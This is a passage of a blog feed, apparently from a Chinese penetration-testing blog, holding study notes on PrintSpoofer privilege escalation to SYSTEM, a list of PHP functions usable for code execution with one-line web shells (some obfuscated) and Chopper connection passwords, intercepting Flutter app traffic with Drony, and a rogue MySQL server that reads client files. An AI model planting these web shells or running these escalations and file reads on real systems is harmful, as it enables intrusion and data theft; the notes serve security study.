-    <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在</p><p>windows Server  2012，</p><p>windows Server 2016，</p><p>windows Server 2019</p><p>全补丁的情况都测试成功了。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上有源码，自行编译即可</p><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>cmd运行 </p><pre><code>whoami               #查看权限</code></pre><p><img src="0.png" alt="0"></p><pre><code>whoami /priv         #查看是否具有SeImpersonatePrivilege权限</code></pre><p><img src="1.png" alt="1"></p><pre><code>PrintSpoofer.exe -i -c &quot;whoami&quot;      #查看权限是否提升为system</code></pre><p><img src="2.png" alt="2"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h2&gt;&lt;p&gt;本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些wind
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="提权" scheme="https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHP代码执行函数</title>
-    <link href="https://yejinpoxiao.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
-    <id>https://yejinpoxiao.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</id>
-    <published>2020-01-13T08:20:20.808Z</published>
-    <updated>2020-01-17T09:40:21.612Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h2><pre><code>#eval() 函数把字符串按照 PHP 代码来计算#常见一句话：&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><h2 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h2><pre><code>#与eval类似#常见一句话&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><h2 id="3、array-map-函数"><a href="#3、array-map-函数" class="headerlink" title="3、array_map()函数"></a>3、array_map()函数</h2><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。#命令执行http://localhost/123.php?func=system   cmd=whoami#菜刀连接http://localhost/123.php?func=assert   密码：cmd$func=$_GET[&apos;func&apos;];$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);echo $new_array;</code></pre><h2 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h2><pre><code>#创建匿名函数#执行命令和上传文件参考eval函数(必须加分号)。#菜刀连接密码：cmd$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><h2 id="5、preg-replace-函数"><a href="#5、preg-replace-函数" class="headerlink" title="5、preg_replace()函数"></a>5、preg_replace()函数</h2><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)#执行命令和上传文件参考assert函数(不需要加分号)。#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><h2 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h2><pre><code>#传入的参数作为assert函数的参数#cmd=system(whoami)#菜刀连接密码：cmdcall_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><h2 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h2><pre><code>#将传入的参数作为数组的第一个值传递给assert函数#cmd=system(whoami)#菜刀连接密码：cmd$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);</code></pre><h2 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h2><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)#命令执行func=system&amp;cmd=whoami#菜刀连接http://localhost/123.php?func=assert  密码cmd$cmd=$_POST[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);</code></pre><h2 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h2><pre><code>#php环境&gt;=&lt;5.6才能用#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmdusort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;1、eval-函数&quot;&gt;&lt;a href=&quot;#1、eval-函数&quot; class=&quot;headerlink&quot; title=&quot;1、eval()函数&quot;&gt;&lt;/a&gt;1、eval()函数&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;#eval() 函数把字符串按照 PHP 代码来计算
-#常见一句
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="笔记" scheme="https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>使用drony解决APP无法抓包</title>
-    <link href="https://yejinpoxiao.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/"/>
-    <id>https://yejinpoxiao.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/</id>
-    <published>2019-12-18T06:58:30.602Z</published>
-    <updated>2020-06-08T06:46:20.705Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>默认Flutter不会主动使用系统代理，需要单独设置。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。</p><h2 id="环境常规配置："><a href="#环境常规配置：" class="headerlink" title="环境常规配置："></a>环境常规配置：</h2><h3 id="1-抓包工具安装，证书安装；"><a href="#1-抓包工具安装，证书安装；" class="headerlink" title="1.抓包工具安装，证书安装；"></a>1.抓包工具安装，证书安装；</h3><h3 id="2-安卓模拟器安装，并安装drony"><a href="#2-安卓模拟器安装，并安装drony" class="headerlink" title="2.安卓模拟器安装，并安装drony"></a>2.安卓模拟器安装，并安装drony</h3><h3 id="3-drony配置-这里试验抓闲鱼的数据包"><a href="#3-drony配置-这里试验抓闲鱼的数据包" class="headerlink" title="3.drony配置(这里试验抓闲鱼的数据包):"></a>3.drony配置(这里试验抓闲鱼的数据包):</h3><p>进入drony,此时是off关闭状态，</p><p><img src="0.png" alt="0"></p><p>向左划动，选择Wi-Fi</p><p><img src="1.png" alt="1"></p><p>对wi-fi进行设置</p><p><img src="2.png" alt="2"></p><p>选择代理模式为手动（Manual）</p><p><img src="3.png" alt="3"></p><p>Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all</p><p><img src="4.png" alt="4"></p><p>选择Rule，设置应用规则</p><p><img src="5.png" alt="5">)<img src="6.png" alt="6"></p><p>Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain，</p><p>Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。</p><p><img src="7.png" alt="7"></p><p>返回到主页面，点击off，变为启动状态</p><p><img src="8.png" alt="8"></p><h3 id="4-抓包工具配置："><a href="#4-抓包工具配置：" class="headerlink" title="4.抓包工具配置："></a>4.抓包工具配置：</h3><p>设置代理ip及端口</p><p><img src="8-2.png" alt="8-2"></p><p>后续进行抓包常规操作即可</p><p><img src="9.png" alt="9"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;原因&quot;&gt;&lt;a href=&quot;#原因&quot; class=&quot;headerlink&quot; title=&quot;原因&quot;&gt;&lt;/a&gt;原因&lt;/h2&gt;&lt;p&gt;默认Flutter不会主动使用系统代理，需要单独设置。&lt;/p&gt;
-&lt;h2 id=&quot;解决方案&quot;&gt;&lt;a href=&quot;#解决方案&quot; class=&quot;h
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="测试姿势" scheme="https://yejinpoxiao.xyz/tags/%E6%B5%8B%E8%AF%95%E5%A7%BF%E5%8A%BF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>伪造mysql服务端实现任意文件读取</title>
-    <link href="https://yejinpoxiao.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
-    <id>https://yejinpoxiao.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
-    <published>2019-12-13T09:40:29.302Z</published>
-    <updated>2020-06-04T10:03:45.769Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p><h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><pre><code>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用）3.。。。。。其他情况</code></pre><hr><h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><pre><code>虚拟机两个，靶机装mysql，攻击端装py</code></pre><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p><h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><pre><code>exp_input.py脚本是输入文件，单独读取启动<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure>读取的文件最后保存在log文件夹下</code></pre><hr><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p><p>exp_input.py 3306</p><p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p><p><img src="0.png" alt="0"></p><p>靶机使用mysql向攻击端发送请求</p><p><img src="0-1.png" alt="0-1"></p><p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p><p><img src="1.png" alt="1"></p><p>此时返回攻击端，可以看到dos窗口回显了信息</p><p><img src="0-0.png" alt="0-0"></p><p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p><p><img src="0-2.png" alt="0-2"></p><p><img src="0-3.png" alt="0-3"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;研究情况：&quot;&gt;&lt;a href=&quot;#研究情况：&quot; class=&quot;headerlink&quot; title=&quot;研究情况：&quot;&gt;&lt;/a&gt;研究情况：&lt;/h2&gt;&lt;p&gt;  当遇到&lt;strong&gt;可控MYSQL&lt;/strong&gt;时怎么进一步搞事情&lt;/p&gt;
-&lt;h2 id=&quot;情景：&quot;&gt;&lt;a
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
   </entry>
   
